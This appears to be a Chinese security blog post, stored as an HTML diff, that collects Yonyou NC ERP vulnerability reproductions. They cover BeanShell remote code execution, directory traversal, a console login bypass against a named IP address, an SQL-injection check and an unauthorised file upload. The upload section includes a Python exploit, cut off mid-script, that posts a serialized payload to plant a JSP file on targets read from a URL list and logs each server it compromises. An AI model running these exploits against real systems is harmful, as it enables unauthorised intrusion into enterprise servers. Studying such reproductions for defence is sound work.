@@ -1,0 +1,776 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.2">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"leeyuxun.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":true,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"./public/search.xml"};
+  </script>
+
+  <meta name="description" content="【CNVD-2021-30167】 用友NC BeanShell远程代码执行漏洞简介用友NC是面向集团企业的管理软件，其在同类市场占有率中达到亚太第一。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="用友NC漏洞集合">
+<meta property="og:url" content="https://leeyuxun.github.io/%E7%94%A8%E5%8F%8BNC%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88.html">
+<meta property="og:site_name" content="Leeyuxun の note">
+<meta property="og:description" content="【CNVD-2021-30167】 用友NC BeanShell远程代码执行漏洞简介用友NC是面向集团企业的管理软件，其在同类市场占有率中达到亚太第一。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20220912222806.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20220912223044.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20220912223133.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20220912223015.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20220912223229.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20220912223315.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20220912223333.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20220912223359.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20220912223709.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20220912223751.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20220912223947.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20220912224230.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20220912224212.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20220912224146.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20220912224336.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20220912224409.png">
+<meta property="article:published_time" content="2022-09-12T14:25:23.000Z">
+<meta property="article:modified_time" content="2022-09-12T15:27:55.000Z">
+<meta property="article:author" content="李钰璕">
+<meta property="article:tag" content="漏洞 用友NC">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20220912222806.png">
+
+<link rel="canonical" href="https://leeyuxun.github.io/%E7%94%A8%E5%8F%8BNC%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88.html">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>用友NC漏洞集合 | Leeyuxun の note</title>
+  
+    <script>
+      function sendPageView() {
+        if (CONFIG.hostname !== location.hostname) return;
+        var uid = localStorage.getItem('uid') || (Math.random() + '.' + Math.random());
+        localStorage.setItem('uid', uid);
+        navigator.sendBeacon('https://www.google-analytics.com/collect', new URLSearchParams({
+          v  : 1,
+          tid: 'UA-163555158-1',
+          cid: uid,
+          t  : 'pageview',
+          dp : encodeURIComponent(location.pathname)
+        }));
+      }
+      document.addEventListener('pjax:complete', sendPageView);
+      sendPageView();
+    </script>
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<style>mjx-container[jax="SVG"] {
+  direction: ltr;
+}
+
+mjx-container[jax="SVG"] > svg {
+  overflow: visible;
+}
+
+mjx-container[jax="SVG"][display="true"] {
+  display: block;
+  text-align: center;
+  margin: 1em 0;
+}
+
+mjx-container[jax="SVG"][justify="left"] {
+  text-align: left;
+}
+
+mjx-container[jax="SVG"][justify="right"] {
+  text-align: right;
+}
+
+g[data-mml-node="merror"] > g {
+  fill: red;
+  stroke: red;
+}
+
+g[data-mml-node="merror"] > rect[data-background] {
+  fill: yellow;
+  stroke: none;
+}
+
+g[data-mml-node="mtable"] > line[data-line] {
+  stroke-width: 70px;
+  fill: none;
+}
+
+g[data-mml-node="mtable"] > rect[data-frame] {
+  stroke-width: 70px;
+  fill: none;
+}
+
+g[data-mml-node="mtable"] > .mjx-dashed {
+  stroke-dasharray: 140;
+}
+
+g[data-mml-node="mtable"] > .mjx-dotted {
+  stroke-linecap: round;
+  stroke-dasharray: 0,140;
+}
+
+g[data-mml-node="mtable"] > svg {
+  overflow: visible;
+}
+
+[jax="SVG"] mjx-tool {
+  display: inline-block;
+  position: relative;
+  width: 0;
+  height: 0;
+}
+
+[jax="SVG"] mjx-tool > mjx-tip {
+  position: absolute;
+  top: 0;
+  left: 0;
+}
+
+mjx-tool > mjx-tip {
+  display: inline-block;
+  padding: .2em;
+  border: 1px solid #888;
+  font-size: 70%;
+  background-color: #F8F8F8;
+  color: black;
+  box-shadow: 2px 2px 5px #AAAAAA;
+}
+
+g[data-mml-node="maction"][data-toggle] {
+  cursor: pointer;
+}
+
+mjx-status {
+  display: block;
+  position: fixed;
+  left: 1em;
+  bottom: 1em;
+  min-width: 25%;
+  padding: .2em .4em;
+  border: 1px solid #888;
+  font-size: 90%;
+  background-color: #F8F8F8;
+  color: black;
+}
+
+foreignObject[data-mjx-xml] {
+  font-family: initial;
+  line-height: normal;
+  overflow: visible;
+}
+
+.MathJax path {
+  stroke-width: 3;
+}
+
+mjx-container[display="true"] {
+  overflow: auto hidden;
+}
+
+mjx-container[display="true"] + br {
+  display: none;
+}
+</style></head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Leeyuxun の note</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">BUPT | SCSS</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-links">
+
+    <a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>友链</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://leeyuxun.github.io/%E7%94%A8%E5%8F%8BNC%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="李钰璕">
+      <meta itemprop="description" content="安全学习笔记">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Leeyuxun の note">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          用友NC漏洞集合
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2022-09-12 22:25:23 / 修改时间：23:27:55" itemprop="dateCreated datePublished" datetime="2022-09-12T22:25:23+08:00">2022-09-12</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" itemprop="url" rel="index"><span itemprop="name">漏洞复现</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="【CNVD-2021-30167】-用友NC-BeanShell远程代码执行漏洞"><a href="#【CNVD-2021-30167】-用友NC-BeanShell远程代码执行漏洞" class="headerlink" title="【CNVD-2021-30167】 用友NC BeanShell远程代码执行漏洞"></a>【CNVD-2021-30167】 用友NC BeanShell远程代码执行漏洞</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>用友NC是面向集团企业的管理软件，其在同类市场占有率中达到亚太第一。</p>
+<span id="more"></span>
+
+<h3 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h3><p>该漏洞是由于用友NC对外开放了BeanShell测试接口，并没有设置权限，攻击者可利用该漏洞在未授权的情况下，构造恶意数据，执行任意代码，最终获取服务器最高权限。</p>
+<h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>用友NC6.5版本</p>
+<h3 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h3><ol>
+<li><p>无需登录，直接访问URL<code>http://xxx.xxx.xxx.xxx/servlet/~ic/bsh.servlet.BshServlet</code>进入BeanShell Test Servlet页面</p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20220912222806.png"></p>
+</li>
+<li><p>BeanShell Test Servlet页面有执行代码的接口，输入payload如：<code>exec("whoami");</code>即可看到命令执行成功。</p>
+</li>
+</ol>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20220912223044.png"></p>
+<ol start="3">
+<li>该漏洞为第三方jar包的漏洞导致的。如果存在<code>servlet/~ic/bsh.servlet.BshServlet</code>路径且能正常访问，则大概率会存在该漏洞。</li>
+</ol>
+<h2 id="用友ERP-NC目录遍历-文件读取漏洞"><a href="#用友ERP-NC目录遍历-文件读取漏洞" class="headerlink" title="用友ERP-NC目录遍历+文件读取漏洞"></a>用友ERP-NC目录遍历+文件读取漏洞</h2><h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>用友<code>ERP-NC</code>存在目录遍历漏洞，攻击者可以通过目录遍历获取敏感文件信息</p>
+<h3 id="影响版本-1"><a href="#影响版本-1" class="headerlink" title="影响版本"></a>影响版本</h3><p>用友ERP-NC</p>
+<h3 id="复现过程-1"><a href="#复现过程-1" class="headerlink" title="复现过程"></a>复现过程</h3><ol>
+<li>无需登录，直接访问URL<code>http://xxx.xxx.xxx.xxx/NCFindWeb?service=IPreAlertConfigService&amp;filename=</code>可查看当前目录</li>
+</ol>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20220912223133.png"></p>
+<ol start="2">
+<li>在filename后面加上文件名即可查看内容</li>
+</ol>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20220912223015.png"></p>
+<ol start="3">
+<li>尝试目录穿越读取敏感文件，发现网上大部分用友NC已经无法实现目录穿越，需在特定条件下才能满足，同时该漏洞的修复版本并位公开。</li>
+<li>该漏洞为第三方jar包的漏洞导致的。如果存在<code>/NCFindWeb?service=IPreAlertConfigService&amp;filename=</code>路径且能正常访问，则则存在该漏洞。</li>
+</ol>
+<h2 id="用友NC控制台密码绕过漏洞"><a href="#用友NC控制台密码绕过漏洞" class="headerlink" title="用友NC控制台密码绕过漏洞"></a>用友NC控制台密码绕过漏洞</h2><h3 id="漏洞描述-1"><a href="#漏洞描述-1" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>用友<code>ERP-NC</code>控制台存在控制台密码绕过漏洞，攻击者可以输入默认密码123456或者抓取更改返回数据包实现任意用户登录。</p>
+<h3 id="影响版本-2"><a href="#影响版本-2" class="headerlink" title="影响版本"></a>影响版本</h3><p>用友NC</p>
+<h3 id="复现过程-2"><a href="#复现过程-2" class="headerlink" title="复现过程"></a>复现过程</h3><ol>
+<li><p>访问URL<code>http://183.252.48.82:81/uapws/index.jsp</code>进入控制台登录页面</p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20220912223229.png"></p>
+</li>
+<li><p>如果password项存在内容，则直接点击OK即可登录，如果不存在内容，则输入任意内容，后更改返回数据包由0变为1即可实现登录。</p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20220912223315.png"></p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20220912223333.png"></p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20220912223359.png"></p>
+<ol start="3">
+<li>如上图所示，成功登录后台。</li>
+</ol>
+<h2 id="用友NC-Cloud-FS文件管理SQL注入漏洞"><a href="#用友NC-Cloud-FS文件管理SQL注入漏洞" class="headerlink" title="用友NC Cloud FS文件管理SQL注入漏洞"></a>用友NC Cloud FS文件管理SQL注入漏洞</h2><h3 id="漏洞描述-2"><a href="#漏洞描述-2" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>用友 <code>NCCloud FS</code> 文件管理登录页面对用户名参数没有过滤，存在 <code>SQL</code> 注入。</p>
+<h3 id="影响版本-3"><a href="#影响版本-3" class="headerlink" title="影响版本"></a>影响版本</h3><p>用友NC</p>
+<h3 id="复现过程-3"><a href="#复现过程-3" class="headerlink" title="复现过程"></a>复现过程</h3><ol>
+<li><p>访问文件服务器管理登录页面</p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20220912223709.png"></p>
+</li>
+<li><p>输入任意用户名和密码，提交登录后截取数据包</p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20220912223751.png"></p>
+<p>发现为POST请求，说明该漏洞已经修复。如果为get请求则存在SQL注入。</p>
+</li>
+</ol>
+</li>
+</ol>
+<h2 id="用友NC-6-5未授权文件上传漏洞"><a href="#用友NC-6-5未授权文件上传漏洞" class="headerlink" title="用友NC 6.5未授权文件上传漏洞"></a>用友NC 6.5未授权文件上传漏洞</h2><h3 id="漏洞描述-3"><a href="#漏洞描述-3" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>用友 <code>NC6.5</code> 版本存在未授权文件上传漏洞，攻击者可以未授权上传任意文件，进而获取服务端控制权限。</p>
+<h3 id="4-2-影响版本"><a href="#4-2-影响版本" class="headerlink" title="4.2. 影响版本"></a>4.2. 影响版本</h3><p>用友NC6.5版本</p>
+<h3 id="4-3-复现过程"><a href="#4-3-复现过程" class="headerlink" title="4.3.  复现过程"></a>4.3.  复现过程</h3><ol>
+<li><p>查看页面<code>/servlet/~uapss/com.yonyou.ante.servlet.FileReceiveServlet</code>内容如下</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">handleRequest</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> {</span><br><span class="line">    ServletInputStream servletInputStream;</span><br><span class="line">    ServletOutputStream servletOutputStream;</span><br><span class="line">    <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="type">FileOutputStream</span> <span class="variable">os</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="type">OutputStream</span> <span class="variable">rtnos</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> <span class="string">""</span>;</span><br><span class="line">    <span class="type">String</span> <span class="variable">fileName</span> <span class="operator">=</span> <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">try</span> {</span><br><span class="line">      servletInputStream = req.getInputStream();</span><br><span class="line">      servletOutputStream = resp.getOutputStream();</span><br><span class="line">      ois = <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>((InputStream)servletInputStream);</span><br><span class="line">      Map&lt;String, Object&gt; metaInfo = <span class="literal">null</span>;</span><br><span class="line">      metaInfo = (Map&lt;String, Object&gt;)ois.readObject();</span><br><span class="line">      path = (String)metaInfo.get(<span class="string">"TARGET_FILE_PATH"</span>);</span><br><span class="line">      fileName = (String)metaInfo.get(<span class="string">"FILE_NAME"</span>);</span><br><span class="line">      <span class="type">File</span> <span class="variable">outFile</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(path, fileName);</span><br><span class="line">      os = <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(outFile);</span><br><span class="line">      <span class="type">byte</span>[] buffer = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">      <span class="type">int</span> <span class="variable">receiveCount</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">while</span> ((receiveCount = servletInputStream.read(buffer, <span class="number">0</span>, <span class="number">1024</span>)) != -<span class="number">1</span>)</span><br><span class="line">        os.write(buffer, <span class="number">0</span>, receiveCount); </span><br><span class="line">      os.flush();</span><br><span class="line">      servletOutputStream.write(<span class="number">1</span>);</span><br></pre></td></tr></table></figure>
+
+<p>可以上传一个反序列化的map，使用TARGET_FILE_PATH和FILE_NAME键确定文件位置，再向后拼接文件内容，实现文件上传。</p>
+</li>
+<li><p>利用poc如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threadpool</span><br><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line">urllib3.disable_warnings()</span><br><span class="line">proxies = {<span class="string">'http'</span>: <span class="string">'http://localhost:8080'</span>, <span class="string">'https'</span>: <span class="string">'http://localhost:8080'</span>}</span><br><span class="line">header = {</span><br><span class="line">    <span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"</span>,</span><br><span class="line">    <span class="string">"Content-Type"</span>: <span class="string">"application/x-www-form-urlencoded"</span>,</span><br><span class="line">    <span class="string">"Referer"</span>: <span class="string">"https://google.com"</span>,</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">multithreading</span>(<span class="params">funcname, filename=<span class="string">"url.txt"</span>, pools=<span class="number">5</span></span>):</span><br><span class="line">    works = []</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">"r"</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> f:</span><br><span class="line">            func_params = [i.rstrip(<span class="string">"\n"</span>)]</span><br><span class="line">            works.append((func_params, <span class="literal">None</span>))</span><br><span class="line">    pool = threadpool.ThreadPool(pools)</span><br><span class="line">    reqs = threadpool.makeRequests(funcname, works)</span><br><span class="line">    [pool.putRequest(req) <span class="keyword">for</span> req <span class="keyword">in</span> reqs]</span><br><span class="line">    pool.wait()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">wirte_targets</span>(<span class="params">vurl, filename</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">"a+"</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(vurl + <span class="string">"\n"</span>)</span><br><span class="line">        <span class="keyword">return</span> vurl</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>(<span class="params">u</span>):</span><br><span class="line">    uploadHeader = {</span><br><span class="line">        <span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"</span>,</span><br><span class="line">        <span class="string">"Content-Type"</span>: <span class="string">"multipart/form-data;"</span>,</span><br><span class="line">        <span class="string">"Referer"</span>: <span class="string">"https://google.com"</span></span><br><span class="line">    }</span><br><span class="line">    uploadData = <span class="string">"\xac\xed\x00\x05\x73\x72\x00\x11\x6a\x61\x76\x61\x2e\x75\x74\x69\x6c\x2e\x48\x61\x73\x68\x4d\x61\x70\x05\x07\xda\xc1\xc3\x16\x60\xd1\x03\x00\x02\x46\x00\x0a\x6c\x6f\x61\x64\x46\x61\x63\x74\x6f\x72\x49\x00\x09\x74\x68\x72\x65\x73\x68\x6f\x6c\x64\x78\x70\x3f\x40\x00\x00\x00\x00\x00\x0c\x77\x08\x00\x00\x00\x10\x00\x00\x00\x02\x74\x00\x09\x46\x49\x4c\x45\x5f\x4e\x41\x4d\x45\x74\x00\x09\x74\x30\x30\x6c\x73\x2e\x6a\x73\x70\x74\x00\x10\x54\x41\x52\x47\x45\x54\x5f\x46\x49\x4c\x45\x5f\x50\x41\x54\x48\x74\x00\x10\x2e\x2f\x77\x65\x62\x61\x70\x70\x73\x2f\x6e\x63\x5f\x77\x65\x62\x78"</span></span><br><span class="line">    shellFlag=<span class="string">"t0test0ls"</span></span><br><span class="line">    uploadData+=shellFlag</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        req1 = requests.post(u + <span class="string">"/servlet/FileReceiveServlet"</span>, headers=uploadHeader, verify=<span class="literal">False</span>, data=uploadData, timeout=<span class="number">25</span>)</span><br><span class="line">        <span class="keyword">if</span> req1.status_code == <span class="number">200</span> :</span><br><span class="line">            req3=requests.get(u+<span class="string">"/t00ls.jsp"</span>,headers=header, verify=<span class="literal">False</span>, timeout=<span class="number">25</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>  req3.text.index(shellFlag)&gt;=<span class="number">0</span>:</span><br><span class="line">                printFlag = <span class="string">"[Getshell]"</span> + u+<span class="string">"/t00ls.jsp"</span>  + <span class="string">"\n"</span></span><br><span class="line">                <span class="built_in">print</span> (printFlag)</span><br><span class="line">                wirte_targets(printFlag, <span class="string">"vuln.txt"</span>)</span><br><span class="line">    <span class="keyword">except</span> :</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="comment">#print(printFlag, end="")</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">len</span>(sys.argv)) &lt; <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">'useage : python'</span> +<span class="built_in">str</span>(sys.argv[<span class="number">0</span>]) + <span class="string">' -h'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        parser =argparse.ArgumentParser()</span><br><span class="line">        parser.description =<span class="string">'YONYOU UC 6.5 FILE UPLOAD!'</span></span><br><span class="line">        parser.add_argument(<span class="string">'-u'</span>,<span class="built_in">help</span>=<span class="string">"url -&gt; example [url]http://127.0.0.1[/url]"</span>,<span class="built_in">type</span>=<span class="built_in">str</span>,dest=<span class="string">'check_url'</span>)</span><br><span class="line">        parser.add_argument(<span class="string">'-r'</span>,<span class="built_in">help</span>=<span class="string">"url list to file"</span>,<span class="built_in">type</span>=<span class="built_in">str</span>,dest=<span class="string">'check_file'</span>)</span><br><span class="line">        args =parser.parse_args()</span><br><span class="line">        <span class="keyword">if</span> args.check_url:</span><br><span class="line">            